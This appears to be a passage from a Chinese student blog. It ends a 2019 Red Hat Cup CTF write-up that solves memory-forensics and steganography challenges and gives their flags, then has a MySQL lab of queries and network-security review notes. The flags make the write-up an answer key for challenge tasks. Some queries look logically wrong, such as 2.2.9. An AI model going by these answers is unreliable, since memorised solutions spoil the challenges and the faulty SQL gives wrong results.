<p>题目总结</p>
<ul>
<li>使用 Audacity 查看音频文件的波形</li>
<li>wave，PIL和numpy包的利用</li>
</ul>
<p>Flag：flag{63177867-8a43-47ab-9048-298867128b3a}</p>
<h2 id="Advertising-for-Marriage"><a href="#Advertising-for-Marriage" class="headerlink" title="Advertising for Marriage"></a>Advertising for Marriage</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>内存取证题，首先查看镜像信息，命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility imageinfo -f Advertising\ for\ Marriage.raw</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191112184416809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="查看镜像信息"></p>
<p>发现需要使用预设WinXPSP2x86</p>
<p>然后查看进程信息，命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility pslist -f Advertising\ for\ Marriage.raw ‐‐profile=WinXPSP2x86</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191112185110796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="查看进程"></p>
<p>发现可疑进程记事本</p>
<p>查看记事本，命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility notepad -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86</span><br></pre></td></tr></table></figure>

<p>发现了题目的暗示（hint）<br>hint:????needmoneyandgirlfirend</p>
<p>扫描所有文件，命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility filescan -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191112190144985.png" alt="发现png图片"></p>
<p>找到一张 png 图片：vegetable.png</p>
<p>导出图片，命令如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility dumpfiles -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 -Q 0x000000000249ae78 -D ./</span><br></pre></td></tr></table></figure>

<p>修改文件格式</p>
<p>89 50 4E 47是png图片的格式，所以将得到的dat格式文件改为png格式，发现了如下信息</p>
<p>在win10下能正常打开图片</p>
<p><img src="https://img-blog.csdnimg.cn/20191112191128549.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="win10下打开png图片"></p>
<p>在kali下打开png图片时报错：IHDR: CRC ERROR</p>
<p><img src="https://img-blog.csdnimg.cn/20191112191353748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="kali下打开png图片"></p>
<p>生成修复后的图片</p>
<p>估计图片尺寸被修改了，用脚本计算图片实际长度和宽度，并且生成修复后的图片</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">img = open(&quot;D:/CTF Practice/vegetable.png&quot;, &quot;rb&quot;).read()</span><br><span class="line"></span><br><span class="line">for w in range(1024):</span><br><span class="line">    for h in range(1024):</span><br><span class="line">        data = img[0xc:0x10] + struct.pack(&#x27;&gt;i&#x27;,w) + struct.pack(&#x27;&gt;i&#x27;,h) + img[0x18:0x1d]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">        if crc32 == struct.unpack(&#x27;&gt;i&#x27;,img[0x1d:0x21])[0] &amp; 0xffffffff:</span><br><span class="line">            print w, h</span><br><span class="line">            print hex(w), hex(h)</span><br><span class="line">            open(&quot;D:/CTF Practice/vegetable_new.png&quot;, &quot;wb&quot;).write(img[:0xc] + data + img[0x1d:])</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<p>用 Stegsolve 查看图片，找到模糊的 flag，一般情况较难恢复,同时，也发现 lsb 有点东西</p>
<p><img src="https://img-blog.csdnimg.cn/20191112191853418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="模糊的flag"></p>
<p>获得flag</p>
<p>开头的 0x00000070 像是后面数据的长度，上网查了一下找到相同的例子，是使用 livz&#x2F;cloacked-pixel 加密的。<br>这个工具解密需要密钥，密钥为上面记事本找到的提示：????needmoneyandgirlfirend，需要魔改工具爆破前 4 字节。</p>
<p>爆破得到密钥 b1cxneedmoneyandgirlfirend。</p>
<p>解密图片隐写信息，得到字符串：VmlyZ2luaWEgY2lwaGVydGV4dDpnbnh0bXdnN3IxNDE3cHNlZGJzNjI1ODdoMA&#x3D;&#x3D;。</p>
<p>进一步 base64 解码得到：Virginia ciphertext:gnxtmwg7r1417psedbs62587h0。</p>
<p>使用 在线维吉尼亚密码解密工具 进行解密，密钥还是前面那个 b1cxneedmoneyandgirlfirend 。</p>
<p>解密得到 flagisd7f1417bfafbf62587e0。</p>
<p>Flag: flag{d7f1417bfafbf62587e0}</p>
<p>总结</p>
<ul>
<li>内存取证 volatility 的使用，见另一篇博客<br><a target="_blank" rel="noopener" href="https://xingshuaikun.github.io/2019/11/12/Volatility%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">https://xingshuaikun.github.io/2019/11/12/Volatility%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</a></li>
<li>png图片的IHDR: CRC ERROR及其修复</li>
<li>Stegsolve，C32ASM工具的使用</li>
<li>livz&#x2F;cloacked-pixel，base64，Virginia</li>
</ul>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p><img src="https://img-blog.csdnimg.cn/20191112200444952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="翻车现场"></p>
<p>Flag：flag{fa0f8335-ae80-448e-a329-6fb69048aae4}</p>
<h1 id="本文参考文章"><a href="#本文参考文章" class="headerlink" title="本文参考文章"></a>本文参考文章</h1><p><a target="_blank" rel="noopener" href="https://impakho.com/post/redhat-2019-online-writeup#toc-9">https://impakho.com/post/redhat-2019-online-writeup#toc-9</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/12/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B/" data-id="cl1qb1dzv007pqktuhppb6xrf" data-title="第三届红帽杯网络安全攻防大赛" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-MySQL实验" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/11/MySQL%E5%AE%9E%E9%AA%8C/" class="article-date">
  <time class="dt-published" datetime="2019-11-11T13:53:42.000Z" itemprop="datePublished">2019-11-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/MySQL/">MySQL</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/11/MySQL%E5%AE%9E%E9%AA%8C/">MySQL实验</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>以前做过的MySQL的实验都快忘了，值此双十一之际竟然找到了，所以就拿来记录一波……</p>
<h1 id="2-表格及其代码"><a href="#2-表格及其代码" class="headerlink" title="2 表格及其代码"></a>2 表格及其代码</h1><h2 id="2-1-所选表格样式"><a href="#2-1-所选表格样式" class="headerlink" title="2.1 所选表格样式"></a>2.1 所选表格样式</h2><p><img src="https://img-blog.csdnimg.cn/20191111234508180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="学生"></p>
<p><img src="https://img-blog.csdnimg.cn/20191111234544738.png" alt="教师"></p>
<p><img src="https://img-blog.csdnimg.cn/20191111220236402.png" alt="学习"></p>
<p><img src="https://img-blog.csdnimg.cn/20191111220514942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="课程"></p>
<p><img src="https://img-blog.csdnimg.cn/20191111234527363.png" alt="学院"></p>
<p><img src="https://img-blog.csdnimg.cn/20191111234603814.png" alt="开课"></p>
<h2 id="2-2-具体问题"><a href="#2-2-具体问题" class="headerlink" title="2.2  具体问题"></a>2.2  具体问题</h2><h3 id="2-2-1-求选修了老师“王刚”开课课程且成绩在90分以上的学生姓名、课程名称和成绩；（姓名，课程名，成绩）"><a href="#2-2-1-求选修了老师“王刚”开课课程且成绩在90分以上的学生姓名、课程名称和成绩；（姓名，课程名，成绩）" class="headerlink" title="2.2.1 求选修了老师“王刚”开课课程且成绩在90分以上的学生姓名、课程名称和成绩；（姓名，课程名，成绩）"></a>2.2.1 求选修了老师“王刚”开课课程且成绩在90分以上的学生姓名、课程名称和成绩；（姓名，课程名，成绩）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT 学生.姓名,课程名,成绩 FROM 教师,开课,课程,学习,学生</span><br><span class="line">WHERE 教师姓名=&#x27;王刚&#x27;</span><br><span class="line">	AND 教师.教师号=开课.教师号</span><br><span class="line">	AND 开课.课程号=课程.课程号</span><br><span class="line">	AND 课程.课程号=学习.课程号</span><br><span class="line">	AND 学生.学号=学习.学号</span><br><span class="line">	AND 成绩&gt;90;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-2-求选修了“王刚”老师所授全部课程的学生姓名和学院名称；（姓名，学院名称）"><a href="#2-2-2-求选修了“王刚”老师所授全部课程的学生姓名和学院名称；（姓名，学院名称）" class="headerlink" title="2.2.2 求选修了“王刚”老师所授全部课程的学生姓名和学院名称；（姓名，学院名称）"></a>2.2.2 求选修了“王刚”老师所授全部课程的学生姓名和学院名称；（姓名，学院名称）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT 姓名,学院名称 FROM 学生,学院</span><br><span class="line">WHERE 学生.学院代码=学院.学院代码</span><br><span class="line">	AND NOT EXISTS</span><br><span class="line">	(SELECT * FROM 教师,开课</span><br><span class="line">    WHERE 教师.教师姓名=&#x27;王刚&#x27;</span><br><span class="line">		AND 教师.教师号=开课.教师号</span><br><span class="line">		AND NOT EXISTS</span><br><span class="line">		(SELECT * FROM 学习,课程,学生 AS S</span><br><span class="line">        WHERE S.学号=学习.学号</span><br><span class="line">	    AND 课程.课程号=学习.课程号));</span><br></pre></td></tr></table></figure>

<h3 id="2-2-3-求没有选修课程“软件工程”的学生学号和姓名；（学生学号，姓名）"><a href="#2-2-3-求没有选修课程“软件工程”的学生学号和姓名；（学生学号，姓名）" class="headerlink" title="2.2.3 求没有选修课程“软件工程”的学生学号和姓名；（学生学号，姓名）"></a>2.2.3 求没有选修课程“软件工程”的学生学号和姓名；（学生学号，姓名）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT 学生.学号,姓名 FROM 学生</span><br><span class="line">WHERE NOT EXISTS</span><br><span class="line">(SELECT * FROM 学习,课程</span><br><span class="line">WHERE 学生.学号=学习.学号</span><br><span class="line">	AND 课程.课程号=学习.课程号</span><br><span class="line">	AND 课程.课程名=&#x27;软件工程&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="2-2-4-求至少选修了两门课程的学生学号；（学号）"><a href="#2-2-4-求至少选修了两门课程的学生学号；（学号）" class="headerlink" title="2.2.4 求至少选修了两门课程的学生学号；（学号）"></a>2.2.4 求至少选修了两门课程的学生学号；（学号）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT 学号 FROM 学习</span><br><span class="line">GROUP BY 学号</span><br><span class="line">HAVING COUNT(课程号)&gt;1;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-5-求课程“经济学”不及格学生姓名和考试成绩；（姓名，成绩）"><a href="#2-2-5-求课程“经济学”不及格学生姓名和考试成绩；（姓名，成绩）" class="headerlink" title="2.2.5 求课程“经济学”不及格学生姓名和考试成绩；（姓名，成绩）"></a>2.2.5 求课程“经济学”不及格学生姓名和考试成绩；（姓名，成绩）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT 姓名,成绩 FROM 学生,学习,课程</span><br><span class="line">WHERE 学生.学号=学习.学号</span><br><span class="line">	AND 课程.课程号=学习.课程号</span><br><span class="line">	AND 课程.课程名=&#x27;经济学&#x27;</span><br><span class="line">	AND 成绩&lt;60;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-6-求至少选修了与学号“T06”-同学选修的课程相同的学生学号；（学号）"><a href="#2-2-6-求至少选修了与学号“T06”-同学选修的课程相同的学生学号；（学号）" class="headerlink" title="2.2.6 求至少选修了与学号“T06” 同学选修的课程相同的学生学号；（学号）"></a>2.2.6 求至少选修了与学号“T06” 同学选修的课程相同的学生学号；（学号）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT 学号 FROM 学习 AS SC1</span><br><span class="line">WHERE NOT EXISTS</span><br><span class="line">	(SELECT * FROM 学习 AS SC2</span><br><span class="line">	WHERE SC2.学号=&#x27;T06&#x27;</span><br><span class="line">		AND NOT EXISTS</span><br><span class="line">		(SELECT * FROM 学习 AS SC3</span><br><span class="line">		WHERE SC1.学号=SC3.学号</span><br><span class="line">			AND SC2.课程号=SC3.课程号));</span><br></pre></td></tr></table></figure>

<h3 id="2-2-7-求至少选修了“C3，C4”两门课程的学生姓名和学院名称；（姓名，学院名称）"><a href="#2-2-7-求至少选修了“C3，C4”两门课程的学生姓名和学院名称；（姓名，学院名称）" class="headerlink" title="2.2.7 求至少选修了“C3，C4”两门课程的学生姓名和学院名称；（姓名，学院名称）"></a>2.2.7 求至少选修了“C3，C4”两门课程的学生姓名和学院名称；（姓名，学院名称）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SELECT 姓名,学院名称 FROM 学生,学院</span><br><span class="line">WHERE 学生.学院代码=学院.学院代码</span><br><span class="line">AND NOT EXISTS</span><br><span class="line">	(SELECT * FROM 课程</span><br><span class="line">	WHERE 课程号 IN (&#x27;C3&#x27;,&#x27;C4&#x27;)</span><br><span class="line">	AND NOT EXISTS</span><br><span class="line">	(SELECT * FROM 学习</span><br><span class="line">	WHERE 学生.学号=学习.学号</span><br><span class="line">	AND 学习.课程号=课程.课程号));</span><br></pre></td></tr></table></figure>

<h3 id="2-2-8-查询“王石”同学没有选修的课程号和课程名；-（课程号，课程名）"><a href="#2-2-8-查询“王石”同学没有选修的课程号和课程名；-（课程号，课程名）" class="headerlink" title="2.2.8 查询“王石”同学没有选修的课程号和课程名； （课程号，课程名）"></a>2.2.8 查询“王石”同学没有选修的课程号和课程名； （课程号，课程名）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT 课程号,课程名 FROM 课程</span><br><span class="line">WHERE 课程号 NOT IN</span><br><span class="line">	(SELECT 课程号 FROM 学习,学生</span><br><span class="line">	WHERE 学生.学号=学习.学号</span><br><span class="line">	AND 姓名=&#x27;王石&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="2-2-9-查询没有被任何学生选修的课程的课程号；（课程号）"><a href="#2-2-9-查询没有被任何学生选修的课程的课程号；（课程号）" class="headerlink" title="2.2.9 查询没有被任何学生选修的课程的课程号；（课程号）"></a>2.2.9 查询没有被任何学生选修的课程的课程号；（课程号）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT 课程号 FROM 课程</span><br><span class="line">WHERE 课程号 NOT IN</span><br><span class="line">(SELECT 课程号 FROM 学习</span><br><span class="line">WHERE 学习.学号=课程.课程号);</span><br></pre></td></tr></table></figure>

<h3 id="2-2-10-求选修了全部课程的学生姓名；（姓名）"><a href="#2-2-10-求选修了全部课程的学生姓名；（姓名）" class="headerlink" title="2.2.10 求选修了全部课程的学生姓名；（姓名）"></a>2.2.10 求选修了全部课程的学生姓名；（姓名）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT 姓名 FROM 学生</span><br><span class="line">WHERE NOT EXISTS</span><br><span class="line">	(SELECT * FROM 课程</span><br><span class="line">	WHERE NOT EXISTS</span><br><span class="line">		(SELECT * FROM 学习</span><br><span class="line">		WHERE 学习.学号=学生.学号</span><br><span class="line">		AND 课程.课程号=学习.课程号));</span><br></pre></td></tr></table></figure>

<h3 id="2-2-11-查询各学院课程“经济学”的平均分，并按照成绩从高到低的顺序排列；（学院名称，平均分）"><a href="#2-2-11-查询各学院课程“经济学”的平均分，并按照成绩从高到低的顺序排列；（学院名称，平均分）" class="headerlink" title="2.2.11 查询各学院课程“经济学”的平均分，并按照成绩从高到低的顺序排列；（学院名称，平均分）"></a>2.2.11 查询各学院课程“经济学”的平均分，并按照成绩从高到低的顺序排列；（学院名称，平均分）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT 学院名称,AVG(成绩) AS 平均分 FROM 学院,学习,学生,课程</span><br><span class="line">WHERE 学生.学院代码=学院.学院代码</span><br><span class="line">	AND 学习.学号=学生.学号</span><br><span class="line">	AND 学习.课程号=课程.课程号</span><br><span class="line">	AND 课程名=&#x27;经济学&#x27;</span><br><span class="line">GROUP BY 学院名称</span><br><span class="line">ORDER BY AVG(成绩) DESC;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-12-查询选修课程“经济学”的学生姓名和所在院系，结果按各院系排列，同时成绩从高到低排列；（姓名，学院名称，成绩）"><a href="#2-2-12-查询选修课程“经济学”的学生姓名和所在院系，结果按各院系排列，同时成绩从高到低排列；（姓名，学院名称，成绩）" class="headerlink" title="2.2.12 查询选修课程“经济学”的学生姓名和所在院系，结果按各院系排列，同时成绩从高到低排列；（姓名，学院名称，成绩）"></a>2.2.12 查询选修课程“经济学”的学生姓名和所在院系，结果按各院系排列，同时成绩从高到低排列；（姓名，学院名称，成绩）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT 姓名,学院名称,成绩 FROM 学生,学院,学习,课程</span><br><span class="line">WHERE 学生.学号=学习.学号</span><br><span class="line">	AND 学生.学院代码=学院.学院代码</span><br><span class="line">	AND 课程.课程号=学习.课程号</span><br><span class="line">	AND 课程名=&#x27;经济学&#x27;</span><br><span class="line">ORDER BY 学院名称,成绩 DESC;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-13-求学时在30-45之间（含30和45）的课程的课程号和课程名称及授课教师；（课程号，课程名，教师姓名）"><a href="#2-2-13-求学时在30-45之间（含30和45）的课程的课程号和课程名称及授课教师；（课程号，课程名，教师姓名）" class="headerlink" title="2.2.13 求学时在30-45之间（含30和45）的课程的课程号和课程名称及授课教师；（课程号，课程名，教师姓名）"></a>2.2.13 求学时在30-45之间（含30和45）的课程的课程号和课程名称及授课教师；（课程号，课程名，教师姓名）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT 课程.课程号,课程.课程名,教师.教师姓名 FROM 课程,教师,开课</span><br><span class="line">WHERE 课程.学时 BETWEEN 30 AND 45</span><br><span class="line">	AND 教师.教师号=开课.教师号</span><br><span class="line">	AND 开课.课程号=课程.课程号;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-14-检索选修课程“经济学”的最高分学生的姓名；（姓名）"><a href="#2-2-14-检索选修课程“经济学”的最高分学生的姓名；（姓名）" class="headerlink" title="2.2.14 检索选修课程“经济学”的最高分学生的姓名；（姓名）"></a>2.2.14 检索选修课程“经济学”的最高分学生的姓名；（姓名）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT 姓名 FROM 学生,课程,学习</span><br><span class="line">WHERE 学生.学号=学习.学号</span><br><span class="line">	AND 学习.课程号=课程.课程号</span><br><span class="line">	AND 课程.课程名=&#x27;经济学&#x27;</span><br><span class="line">	AND 学习.成绩&gt;=ALL</span><br><span class="line">			(SELECT 成绩 FROM 学习,课程</span><br><span class="line">			WHERE 学习.课程号=课程.课程号</span><br><span class="line">				AND 课程.课程名=&#x27;经济学&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="2-2-15-查询选课人数超过5人的课程的课程号及课程名；（课程号，课程名）"><a href="#2-2-15-查询选课人数超过5人的课程的课程号及课程名；（课程号，课程名）" class="headerlink" title="2.2.15 查询选课人数超过5人的课程的课程号及课程名；（课程号，课程名）"></a>2.2.15 查询选课人数超过5人的课程的课程号及课程名；（课程号，课程名）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SELECT 课程.课程号,课程.课程名 FROM 课程</span><br><span class="line"></span><br><span class="line">WHERE 课程.课程号 IN </span><br><span class="line"></span><br><span class="line">	(SELECT 学习.课程号 FROM 学习</span><br><span class="line"></span><br><span class="line">	GROUP BY 学习.课程号</span><br><span class="line"></span><br><span class="line">	HAVING COUNT(学习.学号)&gt;5);</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/11/MySQL%E5%AE%9E%E9%AA%8C/" data-id="cl1qb1dyb003nqktu7roq18zu" data-title="MySQL实验" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MySQL/" rel="tag">MySQL</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-网络安全复习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/" class="article-date">
  <time class="dt-published" datetime="2019-11-11T12:37:43.000Z" itemprop="datePublished">2019-11-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/">网络安全复习</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>过几周就要进行网络安全课程的考试了，所以就简单总结一下知识点，供自己复习之用，大神勿喷嘻嘻(#^.^#)</p>
<h2 id="1-绪论"><a href="#1-绪论" class="headerlink" title="1 绪论"></a>1 绪论</h2><h3 id="1-1-网络安全的基本属性"><a href="#1-1-网络安全的基本属性" class="headerlink" title="1.1 网络安全的基本属性"></a>1.1 网络安全的基本属性</h3><ul>
<li>机密性</li>
<li>完整性</li>
<li>可用性</li>
<li>可靠性</li>
<li>不可抵赖性</li>
<li>隐私性</li>
<li>可说明性</li>
<li>可审计性</li>
</ul>
<h3 id="1-2-安全威胁"><a href="#1-2-安全威胁" class="headerlink" title="1.2 安全威胁"></a>1.2 安全威胁</h3><ul>
<li>信息泄露</li>
<li>信息破坏</li>
<li>拒绝服务</li>
</ul>
<h3 id="1-3-网络攻击"><a href="#1-3-网络攻击" class="headerlink" title="1.3 网络攻击"></a>1.3 网络攻击</h3><ul>
<li>阻断攻击</li>
<li>截取攻击</li>
<li>篡改攻击</li>
<li>伪造攻击</li>
<li>重放攻击</li>
</ul>
<h3 id="1-4-国标信息系统安全等级保护"><a href="#1-4-国标信息系统安全等级保护" class="headerlink" title="1.4 国标信息系统安全等级保护"></a>1.4 国标信息系统安全等级保护</h3><ul>
<li>用户自主保护级</li>
<li>系统审计保护级</li>
<li>安全标记保护级</li>
<li>结构化保护级</li>
<li>访问验证保护级</li>
</ul>
<h3 id="1-5-OSI安全体系结构中的安全服务"><a href="#1-5-OSI安全体系结构中的安全服务" class="headerlink" title="1.5 OSI安全体系结构中的安全服务"></a>1.5 OSI安全体系结构中的安全服务</h3><ul>
<li>认证服务</li>
<li>访问控制服务</li>
<li>机密性服务</li>
<li>完整性服务</li>
<li>不可否认服务</li>
</ul>
<h3 id="1-6-OSI安全体系结构中的安全机制"><a href="#1-6-OSI安全体系结构中的安全机制" class="headerlink" title="1.6 OSI安全体系结构中的安全机制"></a>1.6 OSI安全体系结构中的安全机制</h3><ul>
<li>加密机制</li>
<li>数字签名机制</li>
<li>访问控制机制</li>
<li>信息完整性机制</li>
<li>鉴别交换机制</li>
<li>业务量填充机制</li>
<li>路由控制机制</li>
<li>公证机制</li>
</ul>
